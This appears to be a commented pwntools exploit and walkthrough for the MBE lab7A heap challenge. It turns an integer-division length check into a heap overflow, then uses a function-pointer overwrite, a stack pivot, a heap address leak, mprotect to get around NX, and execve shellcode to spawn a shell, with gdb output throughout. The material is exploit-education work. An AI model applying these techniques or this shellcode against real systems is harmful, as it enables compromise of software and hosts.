# -*- coding: utf-8 -*-

# Security: ASLR + NX + SC (static)
# Lack of -fPIE -pie flags, code segment not being randomized => all the functions and ROP gadgets are at fixed addresses.
'''
[*] '/home/karmaz/MBE/7_HEAP/lab7A'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
'''

# Functions:
'''
1. Create secure message
2. Edit secure message
3. Destroy secure message
4. Print message details
5. Quit
'''

# Vulnerable code - msg_len > 128 && msg_len <132 :
'''
if((new_msg->msg_len / BLOCK_SIZE) > MAX_BLOCKS)
    new_msg->msg_len = BLOCK_SIZE * MAX_BLOCKS;
'''

# Why does it happens - beca`use division on integers (inside the if statement => msg_len / BLOCK_SIZE) returns whole numbers:
'''
>>> 127/4
31
>>> 128/4
32
>>> 129/4
32
>>> 130/4
32
>>> 131/4
32
>>> 132/4
33
'''

# So there is an overflow 3B that overwrites msg_leg memory thus it is possible to set length and overflow with bigger number using "2. Edit secure message" option.
# POC:
'''
gdb-peda$ r
Starting program: /home/karmaz/MBE/7_HEAP/lab7A 
+---------------------------------------+
|        Doom's OTP Service v1.0        |
+---------------------------------------+
|------------ Services Menu ------------|
|---------------------------------------|
| 1. Create secure message              |
| 2. Edit secure message                |
| 3. Destroy secure message             |
| 4. Print message details              |
| 5. Quit                               |
+---------------------------------------+
Enter Choice: 1
-----------------------------------------
-Using message slot #0
-Enter data length: 131
-Enter data to encrypt: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-Message created successfully!

+---------------------------------------+
|        Doom's OTP Service v1.0        |
+---------------------------------------+
|------------ Services Menu ------------|
|---------------------------------------|
| 1. Create secure message              |
| 2. Edit secure message                |
| 3. Destroy secure message             |
| 4. Print message details              |
| 5. Quit                               |
+---------------------------------------+

=> CTRL + C 

gdb-peda$ info variables messages
All variables matching regular expression "messages":

Non-debugging symbols:
0x08106d20  messages  <===

gdb-peda$ x/3wx 0x08106d20
0x8106d20 <messages>:   0x08109730      0x00000000      0x00000000  <<<== Pointer to stored message - encrypted Ax130 +\n

gdb-peda$ x/100wx 0x08109730 -8  <= print 8B before to get the previous chunk and current chunk size
0x8109728:      0x00000000      0x00000111      0x0804a099      0x3ec887c1  <<<<= previous chunk size / <<<= current chunk size 
0x8109738:      0x4705c6e2      0x0956b541      0x4265357e      0x4a42efac
0x8109748:      0x02fd9a5c      0x02a6fe89      0x5fb1a28a      0x35275089
0x8109758:      0x5d3aa3da      0x4b397009      0x6b802977      0x677ef3af
0x8109768:      0x0b4322a8      0x4a9387ae      0x6cff07d8      0x6b95b449
0x8109778:      0x68be4a84      0x21a97eef      0x4daf4a86      0x1d7b1da5
0x8109788:      0x372b8163      0x420f86ce      0x0130ad7f      0x660a219c
0x8109798:      0x0a8a4b0d      0x5c23e130      0x13715cbb      0x54a5ea1f
0x81097a8:      0x490a896a      0x131a9b68      0x136e71e1      0x7f89c680
0x81097b8:      0x064487a3      0x4817f400      0x0324743f      0x0b03aeed
0x81097c8:      0x43bcdb1d      0x43e7bfc8      0x1ef0e3cb      0x746611c8
0x81097d8:      0x1c7be29b      0x0a783148      0x2ac16836      0x263fb2ee
0x81097e8:      0x4a0263e9      0x0bd2c6ef      0x2dbe4699      0x2ad4f508
0x81097f8:      0x29ff0bc5      0x60e83fae      0x0cee0bc7      0x5c3a5ce4
0x8109808:      0x766ac022      0x034ec78f      0x4071ec3e      0x274b60dd
0x8109818:      0x4bcb0a4c      0x1d62a071      0x52301dfa      0x15e4ab5e
0x8109828:      0x084bc82b      0x525bda29      0x522f30a0      0x000a4141 <== 0x000a4141 overwritten msg_len 
0x8109838:      0x00000000      0x000207c9      0x00000000      0x00000000 <<= TOP of the heap <<<=  0x000207c9 => 133065B left
0x8109848:      0x00000000      0x00000000      0x00000000      0x00000000
0x8109858:      0x00000000      0x00000000      0x00000000      0x00000000
0x8109868:      0x00000000      0x00000000      0x00000000      0x00000000
0x8109878:      0x00000000      0x00000000      0x00000000      0x00000000
0x8109888:      0x00000000      0x00000000      0x00000000      0x00000000
0x8109898:      0x00000000      0x00000000      0x00000000      0x00000000
0x81098a8:      0x00000000      0x00000000      0x00000000      0x00000000
'''

# Chunk size is 0x00000111 => 273B =  [4B previous chunk size] + [4B current chunk size] + [3b ~ 1B three least significant bits used for flags]:
''' FLAGS
0x04: The memory belongs to a thread arena.
0x02: The memory was allocated with the function mmap.
0x01: The previous chunk is in use.
'''

# So now edit message can overflow next message by 0xa4141 - 128 = 671937B - create second heap chunk which will store print message delete function
'''
+---------------------------------------+
|        Doom's OTP Service v1.0        |
+---------------------------------------+
|------------ Services Menu ------------|
|---------------------------------------|
| 1. Create secure message              |
| 2. Edit secure message                |
| 3. Destroy secure message             |
| 4. Print message details              |
| 5. Quit                               |
+---------------------------------------+
Enter Choice: 1
-----------------------------------------
-Using message slot #1
-Enter data length: 4
-Enter data to encrypt: ASD
-Message created successfully!
'''
# Edit first message to overflow next message (heap chunk) ( 300 cyclic )
'''
+---------------------------------------+
|        Doom's OTP Service v1.0        |
+---------------------------------------+
|------------ Services Menu ------------|
|---------------------------------------|
| 1. Create secure message              |
| 2. Edit secure message                |
| 3. Destroy secure message             |
| 4. Print message details              |
| 5. Quit                               |
+---------------------------------------+
Enter Choice: 2
-----------------------------------------
-Input message index to edit: 0
-Input new message to encrypt: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
-Message has been successfully modified!
'''

# Use overwritten function (4):
'''
+---------------------------------------+
|        Doom's OTP Service v1.0        |
+---------------------------------------+
|------------ Services Menu ------------|
|---------------------------------------|
| 1. Create secure message              |
| 2. Edit secure message                |
| 3. Destroy secure message             |
| 4. Print message details              |
| 5. Quit                               |
+---------------------------------------+
Enter Choice: 4
-----------------------------------------
-Input message index to print: 1

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x6261616b ('kaab')
EBX: 0x8104f94 --> 0x0 
ECX: 0x1 
EDX: 0x8109840 ("kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac\n\002P'\213\357\205O\250ґUa\353\350z+щ%\344\234\062|\307\004\354@\277}moq\212~f\342.J\037"...)
ESI: 0x8104f94 --> 0x0 
EDI: 0x8104f94 --> 0x0 
EBP: 0xffffce08 --> 0xffffce28 --> 0x0 
ESP: 0xffffcdbc --> 0x804a6a0 (<print_index+185>:       add    esp,0x10)
EIP: 0x6261616b ('kaab')
EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x6261616b
[------------------------------------stack-------------------------------------]
0000| 0xffffcdbc --> 0x804a6a0 (<print_index+185>:      add    esp,0x10)
0004| 0xffffcdc0 --> 0x8109840 ("kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac\n\002P'\213\357\205O\250ґUa\353\350z+щ%\344\234\062|\307\004\354@\277}moq\212~f\342.J\037"...)
0008| 0xffffcdc4 --> 0x0 
0012| 0xffffcdc8 --> 0xa ('\n')
0016| 0xffffcdcc --> 0x804a5f7 (<print_index+16>:       add    ebx,0xba99d)
0020| 0xffffcdd0 --> 0x8104f94 --> 0x0 
0024| 0xffffcdd4 --> 0x354 
0028| 0xffffcdd8 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x6261616b in ?? ()  
    EIP control == 0x6261616b => 140 '''

# There were no system() and "/bin/sh" in the library, since NX bit is enabled there is no way to run own shellcode.
# 1. There is a mprotect() which can make memory space executable, thus bypassing NX.
'''
gdb-peda$ x mprotect
   0x8080270 <mprotect>:        endbr32
'''
# 2. To leak heap address puts(messages) could be used but there is no way to overflow behind puts() to pass an argument. - The solution for that is stack pivoting.
# 3. The plan is to  use numbuf[32] - variable which is used for index to store shellcode / rop chain / mrpotect() and arg for puts().
'''
char numbuf[32];
unsigned int i = 0;
 
/* get message index to print */
printf("-Input message index to print: ");
fgets(numbuf, sizeof(numbuf), stdin);
i = strtoul(numbuf, NULL, 10);
''' #strtoul, strtoull, strtouq - convert a string to an unsigned long integer - so it will return 1 (index) but the rest of data SHELLCODE - will be stored in the buffer.

# The index can store up to 32B of data, but has to start from valid index f.e. "1\x00SHELLCODE"
'''
if(i >= MAX_MSG || messages[i] == NULL)
{
    printf("-Invalid message index!\n");
    return 1;
}
 
/* print the message of interest */
messages[i]->print_msg(messages[i]);
'''

# PLAN TO LEAK:
# 1. Overwrite msg_len
# 2. Create second heap chunk
# 3. Overwrite print() function in second heap chunk with addr of ROP for stack pivoting
# 4. Use 4th option with (index) "1\x00" + "ROPCHAIN"  
#
# 5. ROP in 3rd step have to set ESP to the numbuf variable.
'''
gdb-peda$ disas print_index
   0x0804a69d <+182>:	push   edx
   0x0804a69e <+183>:	call   eax <== call member function
   0x0804a6a0 <+185>:	add    esp,0x10
   0x0804a6a3 <+188>:	mov    eax,0x0
   0x0804a6a8 <+193>:	mov    ecx,DWORD PTR [ebp-0xc]
   0x0804a6ab <+196>:	xor    ecx,DWORD PTR gs:0x14
   0x0804a6b2 <+203>:	je     0x804a6b9 <print_index+210>
   0x0804a6b4 <+205>:	call   0x80818d0 <__stack_chk_fail_local>
   0x0804a6b9 <+210>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804a6bc <+213>:	leave  
   0x0804a6bd <+214>:	ret

gdb-peda$ b *(print_index+183)
gdb-peda$ r
Starting program: /home/karmaz/MBE/7_HEAP/lab7A 
+---------------------------------------+
|        Doom's OTP Service v1.0        |
+---------------------------------------+
|------------ Services Menu ------------|
|---------------------------------------|
| 1. Create secure message              |
| 2. Edit secure message                |
| 3. Destroy secure message             |
| 4. Print message details              |
| 5. Quit                               |
+---------------------------------------+
Enter Choice: 1
-----------------------------------------
-Using message slot #0
-Enter data length: 4
-Enter data to encrypt: ASD
-Message created successfully!
+---------------------------------------+
|        Doom's OTP Service v1.0        |
+---------------------------------------+
|------------ Services Menu ------------|
|---------------------------------------|
| 1. Create secure message              |
| 2. Edit secure message                |
| 3. Destroy secure message             |
| 4. Print message details              |
| 5. Quit                               |
+---------------------------------------+
Enter Choice: 4
-----------------------------------------
-Input message index to print: 0
[----------------------------------registers-----------------------------------]
EAX: 0x804a099 (<print_message>:        endbr32)
EBX: 0x8104f94 --> 0x0 
ECX: 0x0 
EDX: 0x8109730 --> 0x804a099 (<print_message>:  endbr32)
ESI: 0x8104f94 --> 0x0 
EDI: 0x8104f94 --> 0x0 
EBP: 0xffffce08 --> 0xffffce28 --> 0x0 
ESP: 0xffffcdc0 --> 0x8109730 --> 0x804a099 (<print_message>:   endbr32)
EIP: 0x804a69e (<print_index+183>:      call   eax)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804a697 <print_index+176>: mov    edx,DWORD PTR [edx+ecx*4]
   0x804a69a <print_index+179>: sub    esp,0xc
   0x804a69d <print_index+182>: push   edx
=> 0x804a69e <print_index+183>: call   eax
   0x804a6a0 <print_index+185>: add    esp,0x10
   0x804a6a3 <print_index+188>: mov    eax,0x0
   0x804a6a8 <print_index+193>: mov    ecx,DWORD PTR [ebp-0xc]
   0x804a6ab <print_index+196>: xor    ecx,DWORD PTR gs:0x14
Guessed arguments:
arg[0]: 0x8109730 --> 0x804a099 (<print_message>:       endbr32)
[------------------------------------stack-------------------------------------]
0000| 0xffffcdc0 --> 0x8109730 --> 0x804a099 (<print_message>:  endbr32)
0004| 0xffffcdc4 --> 0x0 
0008| 0xffffcdc8 --> 0xa ('\n')
0012| 0xffffcdcc --> 0x804a5f7 (<print_index+16>:       add    ebx,0xba99d)
0016| 0xffffcdd0 --> 0x8104f94 --> 0x0 
0020| 0xffffcdd4 --> 0x354 
0024| 0xffffcdd8 --> 0x0 
0028| 0xffffcddc --> 0x8000a30 <== "0\n" => 0x1c
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804a69e in print_index ()

gdb-peda$ x/8wx $esp
0xffffcdc0:     0x08109730      0x00000000      0x0000000a      0x0804a5f7
0xffffcdd0:     0x08104f94      0x00000354      0x00000000      0x08000a30 <== "0\n"

gdb-peda$ x/s $esp+0x1c
0xffffcddc:     "0\n"
''' # ROP1 => ESP + 0x20
# 0x08062589 : add esp, 0x20 ; pop ebx ; pop esi ; pop edi ; ret

# Exploit
from pwn import *
context.log_level = 'debug'
p = process("./lab7A")
gdb.attach(p,'''
c
''')
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" #execve() 28B

# Send 3B overflow 
p.sendlineafter("Enter Choice: ", "1")
p.sendlineafter("Enter data length: ", "131")
p.sendlineafter("Enter data to encrypt: ", 130*"A")
# ---

# Create second heap chunk with 4 Bytes
p.sendlineafter("Enter Choice: ", "1")
p.sendlineafter("Enter data length: ", "4")
p.sendlineafter("Enter data to encrypt: ", 3*"B")
# ---

# Overflow print() with ROP1 - stack pivoting (EIP == 140) and store the shellcode on the heap
p.sendlineafter("Enter Choice: ", "2")
p.sendlineafter("Input message index to edit: ", "0")
p.sendlineafter("Input new message to encrypt: ", 132*"C" + p32(0x00000000) + p32(0x00000111) + p32(0x08062589) + shellcode) # fill / previous chunk / ROP1 /shellcode
# ---

# Trigger overflow and leak the heap address
p.sendlineafter("Enter Choice: ", "4")
puts_addr = 0x8060600
main_addr = 0x804a70e # main + 4 ( because i had issues with stack frame )
msg_addr =  0x08106d20 # messages array - heap 
p.sendlineafter("Input message index to print: ", "1\x00" + "AAAAAAAAAA" + p32(puts_addr) + p32(main_addr) + p32(msg_addr)) 
ret = p.recvuntil("Enter Choice: ")
heap_leak = u32(ret[0x00:0x04]) # int
log.info("Heap address: " + hex(heap_leak))
# --- 

# Overwrite msg_len with 3 bytes again
p.sendline("1")
p.sendlineafter("Enter data length: ", "131")
p.sendlineafter("Enter data to encrypt: ", 130*"A")
# ---

# Create another heap chunk with 4 Bytes
p.sendlineafter("Enter Choice: ", "1")
p.sendlineafter("Enter data length: ", "4")
p.sendlineafter("Enter data to encrypt: ", 3*"B")
# ---

# Overflow another heap chunk print() with ROP1 - stack pivoting again
p.sendlineafter("Enter Choice: ", "2")
p.sendlineafter("Input message index to edit: ", "0")
p.sendlineafter("Input new message to encrypt: ", 132*"C" + p32(0x00000000) + p32(0x00000111) + p32(0x08062589)) # fill / previous chunk / ROP1
# ---

# Trigger overflow and call mprotect()
p.sendlineafter("Enter Choice: ", "4")
mprotect_addr = 0x8080270
ret_heap_addr = heap_leak + 276 # return to shellcode stored at heap
mprot_page_addr = heap_leak - 0x2330
'''
gdb-peda$ vmmap heap
Start      End        Perm	Name
0x09948000 0x0996a000 rw-p	[heap
>>> 0x994a330 - 0x09948000 
0x2330 <== relative
'''
mprot_size = 0x22000
mprot_priv = 0x7
p.sendlineafter("Input message index to print: ", "1\x00" + "AAAAAAAAAA" + p32(mprotect_addr) + p32(ret_heap_addr) + p32(mprot_page_addr) + p32(mprot_size) + p32(mprot_priv)) 
# --- 

p.interactive()